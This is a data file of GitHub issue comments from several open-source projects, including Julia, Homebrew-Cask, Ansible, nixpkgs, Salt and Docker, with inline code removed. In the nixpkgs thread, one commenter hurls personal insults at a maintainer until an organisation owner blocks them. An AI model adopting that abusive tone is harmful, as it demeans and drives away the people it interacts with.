julia/JuliaLang/11324/104203945,"@friend, it would be pretty easy to add such an iterator for sparse matrices. If you want me to help, just holler. ",,False,False,11324
julia/JuliaLang/11324/104225989,What about option D) move all sparse matrix/vector stuff into a package? I don't see any advantages of this being in Base despite that its there by default. I really think it would help to decouple the development of these things from Julia itself. (ref #5155) ,,False,False,11324
julia/JuliaLang/11324/104313904,"I have to say, I'm with @friend on this one. ",,False,False,11324
julia/JuliaLang/11324/104375086,"Can we finish precompiled packages first? Then we'll talk about it. For now, let's not break every package in JuliaOpt, kay? Dense linear algebra doesn't need to be in base either. Ignoring sparsity leads to way too much of this nonsense Pretending problem structure isn't important and every problem has all-to-all interactions leads to a crippled framework. Ever notice how there's no such thing as JuliaOpt for Torch? ",,False,False,11324
julia/JuliaLang/11324/104381050,@friend Why should that break every package in JuliaOpt? One would just have to put a  into packages that require this from 0.4 on. The reason I bring up this here is that the original suggestion of this thread is to put something from a package into base. And in my opinion this is the wrong direction. The designing of libraries should not be done in Base but outside base. So if you are not fine with removing this stuff than let me ask Why should SparseVectors be in base? What is the benefit of this? ,,False,False,11324
julia/JuliaLang/11324/104386261,"I mean, it WILL break everything in JuliaOpt, which we can then work around. How much effort that takes and pain it causes is contingent on how cleanly the excision goes (which is an open question). There's also the issue of precompilation Tony mentioned; I'm not sure how much an external SparseArrays package would add to our load time. The question is whether that burden is outweighed by the potential gains of removing sparse matrices from Base for 0.4. ",,False,False,11324
julia/JuliaLang/11324/104394617,"We have various syntax changes in 0.4, why should a removal of some code matter more? This is Julia master, it should not be used for production use and thus a breakage of packages is a very natural thing during a dev cycle. The point of moving things into a package is that the maintainability is increased and further any improvement that is done is directly available to users that use stable versions of Julia. In my research lab we rely on stable Julia and thus cannot benefit from any improvement that has been made to the sparse matrix code since 0.3 has been release. If it would be in a package this unnatural coupling would be broken. Regarding the load time I don't see why sparse matrices should be more special than other packages. Note that I do use sparse matrices in a large Julia code base, so I will be equally effected. ",,False,False,11324
julia/JuliaLang/11324/104399451,"This is a bugfix. Read the entire thread, this is fixing a semantic inconsistency in the way the current sparse matrix implementation interacts with 1-dimensional indexing. Sparse matrices are far too large, important, and widely used to consider removing before 0.4. We're already months behind schedule, let's not make it any worse. Considering this has gone poorly every time we've tried it, I have serious reservations about doing this again until we work out how to do it more smoothly. For one thing I've suggested leaving functionality in base but moving it into independent modules instead of exporting it by default, which would leave the functionality still available but behind an import, and cause a much easier-to-deal-with breakage in packages. ",,False,False,11324
julia/JuliaLang/11324/104401058,"@friend @friend, I was on the fence about including sparse vectors in Base, but really this addresses a significant usability and semantics issue with the current implementation, and better yet there's already code to do so and @friend is willing to push through a PR. Agreed with @friend. Let's make the incremental improvement now and not create a huge new time sink for everyone to deal with. ",,False,False,11324
julia/JuliaLang/11324/104402414,"Precompilation will be addressed in time, more significant is what consequences saying ""sparse matrices are not important enough to worry about in base"" would have to the package version of sparse matrices being able to work well at all. If base Julia ignores the existence of sparse matrices and writes all routines in a way that they can only ever be efficient for dense matrices, that will be crippling. You need to rewrite all of LinAlg, every reduction, all of broadcast, all indexing and concatenation over again for every sparse matrix type. And again, squared, for all conversions and linear algebra operations between different types. We need a better framework in base first, for which SparseMatrixCSC can be the first implementation - ideally a small, pluggable one that could live out in a package, but the framework needs to exist first. ",,False,False,11324
julia/JuliaLang/11324/104408031,This attitude is what I object to. We had this ongoing steady stream of broken sparse matrix stuff for a long time. We are past the point where it's acceptable to have that in Base – we're trying to get rid of that kind of thing; it's certainly shouldn't be adding more of. ,,False,False,11324
julia/JuliaLang/11324/104412491,"Stefan, I don't understand why you think it's suddenly fixed. It isn't yet. ",,False,False,11324
julia/JuliaLang/11324/104412887,It's better than it used to be and I object to introducing more half-baked functionality into base. ,,False,False,11324
julia/JuliaLang/11324/104413284,"@friend, I think @friend's proposed PR is already or can be brought to a state that's not half baked before merging. ",,False,False,11324
julia/JuliaLang/11324/104413367,This isn't half-baked. Things have only gotten better by gradual improvement. Which this is a case of. ,,False,False,11324
julia/JuliaLang/11324/104414890,Why should being to large be an argument for not moving it in a package? Importance and widely used are pretty subjective. In my subjective opinion PyPlot is a lot more important and widely used than the sparse module. If I understand Tony correctly there will be major overhaul for the sparse module in the future (e.g. generalization to CSR matrices...) and in my opinion there is no benefit of having this development in base. It will make the development even much harder than if it would be developed in a package. Or does nobody see this point? ,,False,False,11324
julia/JuliaLang/11324/104415703,"@friend, I agree with you and have stated before that CSR shouldn't be developed in base, but that's not related to this PR. Sparse vectors aren't a major overhaul, they're a bugfix. ",,False,False,11324
julia/JuliaLang/11324/104417284,@friend This is not a PR yet but a question how to proceed. If you all want this than simply go ahead and do it. The reason I started this discussion is to show the advantages of this being in a package. And I still have not seen an argument why it would be a bad thing. ,,False,False,11324
julia/JuliaLang/11324/104417336,"We agree with you on everything except timeframe, and maturity of the code removal process. 0.4 shouldn't be removing any more code. 0.4 should also stop adding code that isn't fixing bugs for that matter, and try to get out the door before fall. The bug here is  returns a 1-column matrix instead of a 1-d vector, if there's a way to fix that bug before 0.4 without adding a new type or introducing some ugly fragile workarounds (#11323), speak up. #8718 was on Viral's personal wishlist to get into 0.4 for some time. There's also a non-negligible risk of the sparse code bitrotting and losing a lot of visibility if it gets moved out of base. Sparse matrices will need the right infrastructure to exist in base first (which will have to be developed here) before they can work well as a package, and just as importantly they will need enough people to maintain them or they will wither and die. ",,False,False,11324
julia/JuliaLang/11324/104420397," Timeframe will always be bad Removing the package is an equally valid bugfix ;-)  This is where I object to. If there is not enough momentum to maintain this then the code is simply not important and should definitely not be in base. Visibility loss is also something which can be said about almost every package and we need other mechanisms to highlight ""must have"" packages. ",,False,False,11324
julia/JuliaLang/11324/104423253,"Completely wrong. The perfect time to make major, significant, breaking reorganizations and changes is early in a -dev cycle. We're not early in a -dev cycle, we're overdue for determining scope completion to close the -dev cycle to move to -pre and a release. We've blown past the 6 months for -dev then 3 months in -pre plan already. Not until a replacement is available, tested, and working. And Base is capable of supporting that package working at all. We're way off topic, but the counterargument to that is how few commits to base are necessary to make use of this type of code once it's there and in place. Miles, Iain, etc have very few base commits, but their packages are a major driver of adoption. If Julia has a single killer app right now where it's undoubtedly better than the competition, it's OR, which you can't do at all without sparse matrices. Let's not cause major breakage there by deleting code without preparing a replacement first. ",,False,False,11324
julia/JuliaLang/11324/104425325,I think this is the core point of Tony's argument and it's completely accurate from what I can see. ,,False,False,11324
julia/JuliaLang/11324/104426082,"Yes you are right, I agree with that These discussions always end up with a statement that we are off topic. But where if not here should these discussions happen? I did not say first remove it and then do the package. Of course the order is the other way around.  But you are probably right that doing the package is a little bit more complicated due to the binary dependencies. If these were not there it would be a simple copy of the  directory into a new git repo ",,False,False,11324
julia/JuliaLang/11324/104426730,@friend  What is OR? Does OR require a package? If yes where would be the issue if an additional package is loaded?   ,,False,False,11324
julia/JuliaLang/11324/104429811,"OR = operations research, aka optimization, so JuMP, Convex, MathProgBase, the solver bindings, and to some extent Optim. Yes these require an external package, and it probably wouldn't be the end of the world to add an additional dependency package to the mix, BUT, it needs to be done right. It's not yet clear to me, as things stand right now, if taking sparse matrices out of base wholesale can leave both parts working as well together as they did before moving them. ",,False,False,11324
julia/JuliaLang/11324/104433639,"We all want the same thing here, but I don't find the proposal to block a bugfix in favor of a major reorganization as we're trying to finish up 0.4 very convincing. @friend has put his valuable time and effort into developing sparse vectors, and we all have better things to spend our time on than dealing with the fallout of removing everything sparse from Base. ",,False,False,11324
julia/JuliaLang/11324/109410407,Reading this thread in retrospect taking into account Virals change in the milestone hopefully shows that it could be a good move to decouple the sparse array development from Julia... ,,False,False,11324
julia/JuliaLang/11324/109423932,"@friend there's still no particularly clean way of both fixing the indexing inconsistency bug with SparseVectors as a package while also avoiding massive package breakage or name conflicts by trying to move sparse matrices wholesale into packages. If you would like to start doing the work to prepare package migrations for some of the functionality that's in base right now, please go ahead and start helping do some of that work. ",,False,False,11324
julia/JuliaLang/11324/109544184,"I request not bringing off-topic discussions into issues. I also do not see how this conclusion is drawn - but this is a discussion to be had elsewhere. If you do wish to continue this discussion, I suggest the mailing list or an appropriate issue. ",,False,False,11324
julia/JuliaLang/11324/147981320,Can this be closed in light of ,,False,False,11324
homebrew-cask/Homebrew/27364/193324356,@friend Started working on this in  but it was never finished. Reported issues where we can see the problem  ,,False,False,27364
homebrew-cask/Homebrew/27364/265599111,Is anyone assigned to this? Or does this mean it is open to development by anyone who wants to submit a PR to close it? ,,False,False,27364
homebrew-cask/Homebrew/27364/265601068,Anyone can submit a PR for this. ,,False,False,27364
homebrew-cask/Homebrew/27364/265606741,"In terms of hours of work invested vs. work pending, I feel the unfinished PR is pretty close to completion. By the time of my last commit (8 Dec 2014), the PR seemed feature complete but lacked a few tests. Now with two years having passed, it’s going to need a very thorough rebase on top of that. I’d definitely love to finish it myself but right now I can’t. I have published all my work in progress to the branch  in my fork. As @friend said, anyone is free to work on it. Whoever wants to contribute should feel free to start from scratch – there are definitely quicker and simpler solutions than my large refactoring – or pick up my  branch if deemed helpful, and finish it, or gut it to their heart’s content. Either way, I’m excited and looking forward to having a  command that works like it should! 😊 ",,False,False,27364
homebrew-cask/Homebrew/27364/266098124,"Just tried to rebase, ended up realizing there is no core anymore. I had completely forgotten 😳 Given the work already done was rather invasive, I can’t risk missing any relevant changes to the core while rebasing. So I really want a coherent Git history along the way. To achieve this, I’m thinking of multiple steps  Rebase my work against the old  history, stopping at the last commit before the folder was finally deleted;  then, fork the Homebrew repo, branch off the initial commit from August;  commit the result of step # 1 onto that branch, and  continue rebasing normally against brew/master.   @friend/maintainers Any advice on a simpler solution? How did you go about similar problems in the past? ",,False,False,27364
homebrew-cask/Homebrew/27364/266175371,Not really. Before moving the core we tried to merge as many core-related PRs as possible. The remaining ones were either closed due to lack of interest or merged relatively quickly afterwards. ,,False,False,27364
homebrew-cask/Homebrew/27364/266258007,"@friend Alright. I wonder though what would be the proper way to run any cask command from my dev working copy? Before the transition, we used to have  and  to switch modes. These used to be a piece of cake and was well documented. I wonder where the equivalent thing in Homebrew is? I searched all the folders I deemed somewhat relevant, especially , , , , and of course, the  subtree, but nothing helpful has turned up there. The consequence is that right now, I’m unable to run literally any command from my dev working copy of Homebrew. I have read all the docs – especially the three documents for maintainers – however, I have yet to find anything even remotely related to my issue, or even some kind of documentation on how to properly set up the Homebrew repo for development. Nothing has worked so far. My simplest test case is I look at the commit hash that  gives me. So far, it has never been the one that corresponds to the HEAD of my repo. Speaking of test cases not only are the  scripts gone; someone also seems to have removed almost all of the test tasks from our , which is in the new  directory; this of course broke both  and . This apparantly happened some time after the transition. I wonder how you manage to run any core test cases now? (The documentation to Homebrew does mention “test bots” – however, these are probably not suitable for quickly testing along as I do changes to the core. Also, I can’t access those anyway.) I understand that I’m obviously missing something – but what is it? After one day of achieving literally nothing, I’m running out of ideas and feel really confused and frustrated. Would you mind please giving me a nudge in the right direction? ",,False,False,27364
homebrew-cask/Homebrew/27364/266264145,"As far as I can remember the scripts were linking the development tap to , so these were removed because they wouldn't have worked anymore, as the  command is now integrated into Homebrew. Now you will either have to checkout to a different branch in the  while developing, or set up a separate Homebrew installation. Tests are now run with , which you can find in . However, I am currently in the process of merging these with . ",,False,False,27364
homebrew-cask/Homebrew/27364/267471968,"@friend Thanks for the pointers! I don’t see how these two things are related. If we’re able to move a thing from A to B, how are we not able to modify those scripts to have them point to B instead of A, rather than throwing them away? That, admittedly, is a little beyond me. To explain the itch behind my question, I’m going to let you guys in on the fact that I find myself having a embarrassingly hard time getting my dev environment up and running, especially when compared to the old HBC repo. This factoid is seemingly unrelated to the discussion at hand, and it might not have anything to do with Homebrew, and might very well have everything to do with my personal attitude, learning curve, or patience. Except when it doesn’t. The thing is, I was bitten once and became shy twice. I do love Homebrew, you know. It’s a pleasure to use, and certainly an insanely convenient thing to have. I do also love . But boy, have I learned to steer clear of ever standing in its merry way. To back up my claim, I just need to look at my local working copy of HBC. Not a long time ago, I used to know exactly how, and when, to , mainly thanks to . Never did I break, let alone lose, any of my work on a Cask or the HBC code. Now compare to all this my stash of custom Homebrew formulae. I’ve written only a handful of those throughout the years. Nothing spectacular, and all of them for my own use. Sometimes my formulæ even have credentials in it because who cares. I used to tuck away all those formulae of mine in private branches but guess what? One day in 2015, my formulae started to disappear. My uncommitted changes? Vanish into thin air. My branches? Poof. At first, I would not notice – because whatever it is that keeps snatching my formulae, the thing loves to strike silently, probably out of spite, or maybe because it secretly longs to be a ninja. By all means, it chooses not to blow up in my face like Git does whenever it finds a hairline crack in a whitespace (but wait … didn’t Homebrew use exactly Git behind the scenes? … Oh right, they use  now. My bad). So, weeks pass, or even months, without me noticing my formulÆ are gone, until the day there is some upstream release, and off I go and update formula XY, or so I think! Actually, I can’t update formula XY because formula XY is gone. Gone because someone decided to change the color of the magic smoke inside  once again and the old smoke took with it all the feature branches, or stashes, with my custom formulæ in them. Do I bother? Keg no. I usually just shrug and move on with my life because I’m a big girl and I can cope with worse things than the fact that formula fidgeting and  magic are just not my thing. But now that HBC is with Homebrew, all of that has changed, I guess? No more weaseling out of staying on top of how  works internally this season! Gonna have to bite the bullet and learn how to , and how not to have my stuff ninja clobbered, right? Because – albeit admittedly on-and-off – I am a Homebrew-Cask core maintainer and I plan to remain one for years to come. Yes, I’m going to bite the bullet and work on the HBC core in a private branch, below , and stop complaining, and become a socially likeable person again. But before I do that, may I ask the simple question Why exactly is it that we cannot keep  and  around? Pinging @friend/maintainers for advice, consolation, or both. ",,False,False,27364
homebrew-cask/Homebrew/27364/267601212,"To be honest, I hadn't used these scripts before the merger, so there wasn't any incentive for me to make them work with the new setup, and nobody complained when they were gone. Also, keeping them in  doesn't really make sense anymore since this is now just a Tap. I can't say anything about this since I never had any trouble with , but I understand your frustration and therefore need to have a decoupled development copy. Much of Homebrew-Cask is now intertwined with the Homebrew core, and will only get more integrated over time, so you will probably end up editing the Homebrew core anyway – ~~~~, basically. Of course you could argue that the scripts can be adapted to edit the Homebrew core instead, but I think it's really a matter of personal preference if you want to work directly inside the production  or  a second development copy. ",,False,False,27364
homebrew-cask/Homebrew/27364/267633770,"It’s not that I’m trying to bring back this feature purely for my own convenience. Let’s put ourselves – for a moment – in the shoes of a first-time code contributor who has just cloned the repo to, say, , has written some code, and is now just about to test their first PR. Is it then not poor UX&lt;sup&gt;[1](#footnote-1)&lt;/sup&gt; to have them learn to their surprise that there’s no way to run the code they just built? For the record, I’m positive that whoever removed the scripts did it with the best of intentions in mind. This doesn’t change how unhappy I am with the status quo though. &lt;p id=""footnote-1""&gt;&lt;sub&gt;&lt;strong&gt;[1]&lt;/strong&gt; or dev’s experience, in that instance&lt;/sub&gt;&lt;/p&gt; Lucky you. 🍀  But even in a bug-free universe, where  plays with kittens, I believe the UX aspect (see above) is still crucial in the long run. Contributing code needs to be accessible for anyone with a GitHub account. You’re correct; it’s not what I had in mind either. Basically, what I want to achieve here is a workflow roughly similar to what we had before the transition. To get more precise, what I’m trying to do is this   Step Status Description     Step 1 Normal I choose a location in the filesystem, e. g. .   Step 2 Normal I  the complete Homebrew repo to , either from the official repo or from my own fork.   Step 3 Normal → Linked I’ve just written some code, now I need to test it. Thus, I run .   Step 4 Linked From now on, whenever I say &lt;sup&gt;[2](#footnote-2)&lt;/sup&gt;, it’s going to do the exact thing that  says instead of what  says &lt;sup&gt;[3](#footnote-3)&lt;/sup&gt;.   Step 5 Linked → Normal I have finished my work. Now I’m ready to go back to production mode; thus, I run .   Step 6 Normal All is back to normal. I can run . In particular, my work in  is completely safe from the grasp of .    &lt;p id=""footnote-2""&gt;&lt;sub&gt;&lt;strong&gt;[2]&lt;/strong&gt; Let’s ignore the non-cask  commands for now. I’d be indifferent as to where those would point.&lt;/sub&gt;&lt;/p&gt;&lt;p id=""footnote-3""&gt;&lt;sub&gt;&lt;strong&gt;[3]&lt;/strong&gt; or whatever  happens to be at that moment&lt;/sub&gt;&lt;/p&gt;What I’d love to do is write a script that simply does what the table says. At the moment, I have no idea how to go about that, or where to start looking for a solution. If I knew more about Homebrew, or if someone kindly helped me fill in the blanks, I would gladly implement the script myself, and then send a PR on its way. Another strategy might be to do simple symlink trickery, like the old scripts did. (If I only had an idea what precisely needs to be linked, and to which target?) If I knew, I could restore  and just change it there. @friend/maintainers Any pointers? ",,False,False,27364
homebrew-cask/Homebrew/27364/267641003,"You know what? You could probably just simply call  aliased as  or the like. This way  is safe, even if you forget to run . ",,False,False,27364
homebrew-cask/Homebrew/27364/267641799,"Thanks @friend, will try this right away! ",,False,False,27364
homebrew-cask/Homebrew/27364/269709568,@friend The solution you suggested has worked great so far! Exactly what I needed to get going. 👍  Cloning into 'brew'... […] $ cd brew Homebrew-Cask 1.1.5-66-g4ca2eaf caskroom/homebrew-cask (git revision de574; last commit 2016-12-29) $ bin/brew cask --version ==&gt; I’m in the dev repo ♠ ,,False,False,27364
homebrew-cask/Homebrew/27364/269768407,Great to hear! 👍 ,,False,False,27364
homebrew-cask/Homebrew/27364/269781074,Can also attest to that. Used it for ,,False,False,27364
homebrew-cask/Homebrew/27364/461307157,This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. ,,False,False,27364
homebrew-cask/Homebrew/27364/461651970,"@friend I seem to recall some discussion not too long ago (was already 2019?) in either the Homebrew/brew or Homebrew/homebrew-core repo about this very subject, and the conclusion being that it’s best to avoid having formulae in third-party taps whose tokens conflict with the official taps. Is this issue still worth pursuing? ",,False,False,27364
homebrew-cask/Homebrew/27364/468502432,This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. ,,False,False,27364
core/owncloud/2862/13045944,"What's worse is I don't seem to be able to ignore/use Apache's dontlog syntax to resolve it. grep -c PROPF /var/log/httpd/httpd-access.log     2802  That's about 1/4 of the logged requests. PROPFIND and GET requests account for about 4200 requests. This syntax works for other URI requests     SetEnvIfNoCase Request_URI ""^PROPFIND"" dontlog  but not for those. Requests from the desktop/browser are cheerfully ignored but not from the mini-client. I thought it might be something in Apache that sets authenticated requests aside and always logs them but the desktop/browser test disproved that. I find I can't even filter by IP address they still get logged. I haven't had an opportunity to capture and examine packets to see what's ado. It's a low priority issue as I can't use owncloud properly (i.e., with encryption) due to my ISP's peculiar attitudes about security. But perhaps an annoyance that needs sorting. ",,False,False,2862
core/owncloud/2862/22272807,I’m closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch – see the developer manual. ) Thank you! ,,False,False,2862
ansible/ansible/46215/364529796,"SUMMARY I'd like to be able to use the combine-filter but merge in reverse order. ISSUE TYPE  Feature Idea  COMPONENT NAME No idea ADDITIONAL INFORMATION One common pattern that I return to when constructing Ansible roles is to have some variables for the role described (with defaults) in  and then apply some defaults or transformations to that data inside  (prefixing the variable with  to make it clear that the variable is internal and manipulated). Example defaults/main.yml vars/main.yml This allows me to define my variables in my inventory like this inventory/development/group_vars/database/vars.yml …while not having to put lots of -filters in my task files. Now to my problem. See the  definition above. If I could reverse the merge-order of combine I could define it like this instead vars/main.yml Which reads a lot nicer. I use the above approach when I want to override something in a list of objects (which comes up more seldomly) yaml _db_user_overrides   admin false _db_users &gt;-   {{ db_users | map('combine', _db_user_overrides) | list }} ♠ Solution(?) Either a -filter or a new key to the -filter would do. Maybe  or  (as in left-to-right merge). ",,False,False,46215
ansible/ansible/46215/425136209,"Files identified in the description  lib/ansible/inventory lib/ansible/modules/files/file.py lib/ansible/modules/packaging/os/apt.py lib/ansible/parsing/utils/yaml.py lib/ansible/playbook/role test/integration/targets/apt/defaults/main.yml test/integration/targets/binary/vars/main.yml  If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help  ",,False,False,46215
ansible/ansible/46215/425136216,cc @friend click here for bot help  ,,False,False,46215
ansible/ansible/46215/425146125,"soo, why not just switch the variables? is the same as your example w/o requiring a new keyword ",,False,False,46215
ansible/ansible/46215/425361948,Is it though?  is a dict and not a list. Not sure what applying the  filter on a dict would do. ,,False,False,46215
ansible/ansible/46215/425363459,@friend Here's a test of your suggestion combine.yml ,,False,False,46215
ansible/ansible/46215/425371186,If there was a -filter that took input and produced a stream of  copies of it I could do something like this The replicate filter would work like this So that's another solution to my problem. /Mattias — who's aware that he's very focused on his particular problem right now ;) ,,False,False,46215
ansible/ansible/46215/425376958,I'll try to implement this as a filter-plugin in my local repository and see if I can get it all to work. Would you be interested in a PR then later? ,,False,False,46215
ansible/ansible/46215/425423184,Added a PR for this. ,,False,False,46215
ansible/ansible/46215/425443130,"combine takes N dictionaries, all terms need to be dicts, it should not work if any is a list no matter the order. The issue here is your use of map more than the issue with the combine filter itself ",,False,False,46215
ansible/ansible/46215/425467027,"Well... Also the code was based on your suggestion. No it's not. One might add support for my use case by extending  instead of , but there really isn't an issue with my use of map. I'm not trying to split hairs here. Rather I'm trying to communicate an issue with the way you communicate. It really is unnecessarily provocative. Please try to drop the attitude. ",,False,False,46215
ansible/ansible/46215/425474167,"sorry, i might have phrased that better, its not that you are using map incorrectly, its that you are using map at all that is the issue here. This is a limitation of map, not combine. ",,False,False,46215
ansible/ansible/46215/425481607,Thanks! All good 😊 ❤️ I agree with your premise and I'll continue the discussion in the PR. I have some other ideas that might be helpful as well! ,,False,False,46215
ansible/ansible/46215/464418595,"Files identified in the description None If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help  ",,False,False,46215
ansible/ansible/46215/472522411,"I found a hacky solution for this use case First, combine each dict with the defaults (override with defaults). Then, zip these n ""defaults"" with each dict and finally map these tuples of dicts using combine. Example This is how you create a new users dict, with defaults applied ",,False,False,46215
ansible/ansible/46215/472823048,"I've done lots of those. ♥ Eventually started writing my own filters that I put together with my playbooks. Mmmm, I love this! 😂♥ ",,False,False,46215
nixpkgs/NixOS/27258/241526242," should be using the POSIX 2008  instead of fgets. If, for some reason there are targets that do not have POSIX 2008, add configuration flags to also accommodate for non-POSIX 2008 systems, develop a NixOS module to control this behavior with sane defaults set depending on the platform (which also should be integrated with the installer eventually). (Feel free to create other tickets for these tasks, if need arises.) @friend Version master ",,False,False,27258
nixpkgs/NixOS/27258/313923818,"I don't use NixOS/nixpkgs anymore, so feel free do do what you want, but with regards to your claim that it should not use ""brittle"" C functions you have to substantiate such claims, i.e. prove what supposedly makes  (which has well defined behaviour) ""brittle"" in this specific context. @friend ",,False,False,27258
nixpkgs/NixOS/27258/313926173,"Seems to me that if the user enters a NUL, the current code will ignore everything the user enters after the NUL (strlen stops at first NUL, whereas fgets is happy to continue reading until newline). If users feed binary data to this program, the input key passed to the kdf may be substantially shorter than expected. No idea if there are any practical implications re how this program is intended to be used, though. ",,False,False,27258
nixpkgs/NixOS/27258/313927667,"Correct, but using  won't change that, since the required delimiter would still be a newline. The pbkdf2 wrapper (and that program is nothing more) exists to derive a binary key from a non-binary (human memorable) passphrase + binary (hex encoded) salt. If you already had a binary key, you wouldn't need to use a kdf. ",,False,False,27258
nixpkgs/NixOS/27258/313930697,"Truncation occurs because of , which  solves by reporting the number of bytes it read.  Presumably, the strength of the derived key would be unaffected by truncation, but it seems recovering the key could accidentally become easier. As long as users never feed strange inputs to the program, there's no problem, but I think it's unfair to discount the potential (whether or not it's worth doing anything about it). ",,False,False,27258
nixpkgs/NixOS/27258/313933720,"Thanks, I overlooked that; this is a good argument for replacing the + pair with , though as I said, I haven't used this (in a long time) and unless someone else still does you should just drop the whole thing (and keep it from bitrotting further). No, because the derived key is used exclusively for accessing an already encrypted LUKS volume. The input is retrieved via explicit shell prompt at boot time and then fed into the program and you can't enter a null byte on the kernel tty (so you wouldn't use one when setting up the LUKS volume, anyway). ",,False,False,27258
nixpkgs/NixOS/27258/313949624,There is a reason I remembered this quote when I read your message. ,,False,False,27258
nixpkgs/NixOS/27258/313950378,"That's your prerogative, but irrelevant to the issue at hand. ",,False,False,27258
nixpkgs/NixOS/27258/313954390,"@friend What is the issue at hand according to you? I can imagine that technically and even mathematically there is no problem, but the thing is, I don't even want to read an explanation of an analysis written by in this case the original author. Not because I don't believe it to be correct, but it's because I don't want someone else to also have to understand that analysis in order to believe the code works. It's simply more costly from a maintenance point of view to require such reasoning. Consider that someone wants to call this code from another context and then the whole analysis needs to be done again (and typically is never done and it results in a bug). Also note that you haven't even documented a valid input specification. Really, your code is just a disaster waiting to happen and you apparently need to have this explained multiple times before you get it, and perhaps you will never get it. There are more issues with your code, btw. For example, you make implementation choices when applying an algorithm that are not referenced to scientific literature or with any other kind of justification. In short, I would consider this code written by someone who can instruct a computer what to do, but just lacks the wisdom to tell the computer the right things to do. ",,False,False,27258
nixpkgs/NixOS/27258/313963652,"The issue is that (as written above) the + pair should be replaced by  iff. it's worth for this project to keep the functionality provided by the semantic block it belongs to. That's not for me to decide, since I don't use it anymore. Again, your prerogative, but not relevant to the issue at hand. That is always the case if one reuses a piece of code in another context. This is not new. That's a mistake of the person reusing C code for another purpose without doing the proper analysis. Of course not, it's an internal component, not part of a public interface. The code will result in disaster when someone abuses an internal component for a different purpose without analysing whether its applicable. Your continued ad hominem attacks (after providing an incomplete bug report) remain irrelevant. That would only be an issue if the derived key was used for something other than decryption of preexisting encryption. As I have pointed out before, your personal attacks serve no purpose with regards to this issue. ",,False,False,27258
nixpkgs/NixOS/27258/313972404,@friend The hole you been digging for yourself is now so deep that all I have to do now is to give you a little push. Did you know your C program has undefined behavior? ,,False,False,27258
nixpkgs/NixOS/27258/313974449,"Since after a civil reminder you insist on keeping up the hostile and - frankly - abuse behaviour, I won't spend more of my time on you ) ",,False,False,27258
nixpkgs/NixOS/27258/314022707,"@friend You are the one who kept insisting that the code was good and that only if others would make a mistake (implying that you are the god of programming) that there would be an issue. Then finally, when I have carefully positioned you such that there is no escape left, you start to cry like a little baby about how hostile I am? You were acting as the most obnoxious person I have ever seen here and you needed to be taught a lesson in humility. The trait most people like you have is that they are unaware of their own limitations and they just keep on sharing their incompetence with the rest of the world. It is pathetic. ",,False,False,27258
nixpkgs/NixOS/27258/314057285,"@friend I've blocked you from the NixOS organization. This isn't the first time you've engaged in personal attacks on contributors, and I've had enough. ",,False,False,27258
nixpkgs/NixOS/27258/314073889,"@friend Don’t let that behaviour get to you; the person suddenly appeared a few days ago (see their profile) and started commenting hundreds of issues/PRs, always with a doubtful attitude. I wasn’t sure what to make of it because it seemed like they were contributing, but apparently they just wanted to burn stuff. Nothing gained nothing lost I’d say. ",,False,False,27258
nixpkgs/NixOS/27258/314383511,"I approve @friend actions, FYI. @friend you're very welcome to reopen the PR, I'll review it shortly. ",,False,False,27258
salt/saltstack/49765/363390972,"Description of Issue/Question Don't understand the attitudes of the people on IRC Setup I am deploying windows machines. The deployment system auto installs salt with the correct salt ID's (that's pretty neat but I won't go into details). The salt ID's are partially based on a date stamp and remain permanent for the life of the PC. They are effectively the true names of the PC's. The deployed machines are not set up to automatically domain join. Partly because the Windows computer names names are somewhat in flux. Partly because my boss and co-workers don't want our credentials stored anywhere To domain join I create an sls file which can be invoke by the sysamin. The runner will ask for a user name and password and pass that as pillar data. The intended computer names come out of an external pillar (stored in a postgresql db). The runner then just applies the state and the PC's join with their intended names. I've been testing this today and it's working well, but people on the #salt irc channel were giving me flak and insinuating that I'm an idiot. BTW i don't care if i am an idiot. I just want to know why anything I'm doing is worse than anything anyone else does. I have asked #windows people ""how do you join 100 machines?"". This is the conversation So there you have it, the typical process involves someone ineracting with 100 machines. I avoid all that. Why am I being criticised? ",,False,False,49765
salt/saltstack/49765/424199511,"Hi @friend. I lead the core maintainers team at Salt. I'm sorry you felt criticized. In the morning, I'll ask somebody on @friend/team-windows to try to help you with your question specifically. I do want to respond, however, to your comment about the ""vision of management"" of Salt to ""extend in every direction"". As the principal maintainer of this project, my view is one of great pride that people in our community are trying to offer what they may see as the best solution for a problem, regardless of whether or not that answer involves Salt. While I hope that we can always continue to grow the project to cover more ground, If another solution for a given problem is better than ours, I hope our community continues to have the integrity to heartily recommend it over Salt in the interest of being as helpful as possible instead of merely dogmatic. That said, I hope you'll keep using Salt and, as I said, I'll make sure the Windows folks get in touch with you in the morning to see if there's a way that Salt can be made to work in a way that solves the problem you're concerned with. Best, -Mike ",,False,False,49765
salt/saltstack/49765/424200620,"@friend I don't need any help specifically. All of the specific technical problems I was having are resolved. My first question was ""how could this be done better without salt"", since people were implying that it could. I couldn't think of any solution that would be substantially simpler in terms of number of operations. I'll forget about the scond point I was making for the time being. ",,False,False,49765
salt/saltstack/49765/424255317,"I assume above is the main point of this issue. There is a slack channel for windows help. Slack keeps a few days worth of history, so if people are not constructive in their comments  its more noticeable. (Invite sent to you email address) ",,False,False,49765
salt/saltstack/49765/450513347,I'm sorry about this. Anyway I've come up with a much better system thanks to some of the help I got on slack. Thanks to all the people who have helped me with suggestions so far. ,,False,False,49765
moby/moby/3378/24853626,"I have several Dockerfiles to build images which eg setup a postgresql client, set up a generic python app environment I want to make a Dockerfile for my python webapp which combines both those images and then runs some more commands If I understood the docs correctly, if I use  a second time I start creating a new image instead of adding to the current one? ",,False,False,3378
moby/moby/3378/295133077,"Here's the thing, I don't necessarily need merge. I think a lot of the problems could be solved with a rebase. My normal use case is A (ubuntu) -&gt; B (e.g. nginx) A (ubuntu) -&gt; C (e.g. node) And I want a combined B &amp; C image. Usually they don't have anything to do with each other, so it would be sufficient just to rebase all the diffs between A and C onto B. i.e. A -&gt; B -&gt; C' That seems like a simpler problem to solve. ",,False,False,3378
moby/moby/3378/295143655,"@friend Typically Node.js applications don't need this feature to work with Nginx (in my opinion). Docker way would be two containers, one for Nginx, the other for Node. We configure Node container to expose its port only to the Nginx container, and let Nginx container to listen to the public port (like 80). Any reason why Nginx needs to be in the same container as Node? ",,False,False,3378
